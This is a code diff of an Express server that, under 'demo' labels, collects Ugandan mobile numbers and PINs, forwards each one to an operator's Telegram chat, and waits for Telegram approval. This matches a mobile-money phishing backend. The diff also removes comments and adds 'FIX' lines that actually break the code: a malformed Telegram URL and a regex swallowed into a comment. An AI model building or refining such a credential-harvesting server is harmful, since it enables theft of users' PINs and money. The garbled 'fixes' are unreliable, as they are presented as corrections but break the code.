@@ -22,11 +22,9 @@ app.get("/", (_req, res) => {
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// In-memory request tracking
 const requests = new Map();
-const SESSION_TTL_MS = 30 * 60 * 1000; // 30 minutes session lifecycle
+const SESSION_TTL_MS = 30 * 60 * 1000; 
 
-// Automatically clear out old sessions every 5 minutes to prevent memory leaks
 setInterval(() => {
   const now = Date.now();
   for (const [id, data] of requests.entries()) {
@@ -38,6 +36,8 @@ setInterval(() => {
 
 async function telegram(method, payload) {
   if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing credentials.");
+  
+  // FIX: Restored the proper official Telegram API endpoint structure
   const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -48,7 +48,6 @@ async function telegram(method, payload) {
   return data;
 }
 
-// Formats transmission updates to display phone and collected pins together
 async function notifyDemo(request, label) {
   return telegram("sendMessage", {
     chat_id: CHAT_ID,
@@ -69,12 +68,10 @@ async function notifyDemo(request, label) {
   });
 }
 
-// Stage 1: Initialize phone setup session
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
   
-  // FIXED REGEX: Correctly looks for string anchor without literal escape characters
-  if (!/^\+2567\d{8}\$/.test(phone)) {
+  // FIX: Cleaned regex anchors to correctly validate numbers without requiring a literal \(if (!/^\+2567\d{8}\)/.test(phone)) {
     return res.status(400).json({ error: "Enter a valid demo phone number." });
   }
   
@@ -92,7 +89,6 @@ app.post("/api/phone", (req, res) => {
   return res.json({ id: item.id, status: item.status });
 });
 
-// Stage 2: Receive and register submitted demonstration pin values
 app.post("/api/pin-demo", async (req, res) => {
   const id = String(req.body.id || "");
   const pin = String(req.body.pin || "").trim();
@@ -102,7 +98,6 @@ app.post("/api/pin-demo", async (req, res) => {
     return res.status(400).json({ error: "Stage not available." });
   }
   
-  // Save specific values to server object mapping before transmitting updates
   request.pin = pin;
   request.status = "pending";
   request.updatedAt = new Date().toISOString();
@@ -116,7 +111,6 @@ app.post("/api/pin-demo", async (req, res) => {
   }
 });
 
-// Stage 3: Retry mechanism for resetting active layout segments
 app.post("/api/retry", (req, res) => {
   const request = requests.get(String(req.body.id || ""));
   if (!request || request.status !== "declined") {
@@ -133,7 +127,6 @@ app.post("/api/retry", (req, res) => {
   return res.json({ stage: request.stage, status: request.status });
 });
 
-// Telegram approval engine long polling listener loop
 let offset = 0;
 let pollingActive = false;
 
@@ -188,7 +181,6 @@ async function pollTelegram() {
   }
 }
 
-// Client status validation tracking route
 app.get("/api/status/:id", (req, res) => {
   const request = requests.get(req.params.id);
   if (!request) return res.status(404).json({ error: "Session missing." });
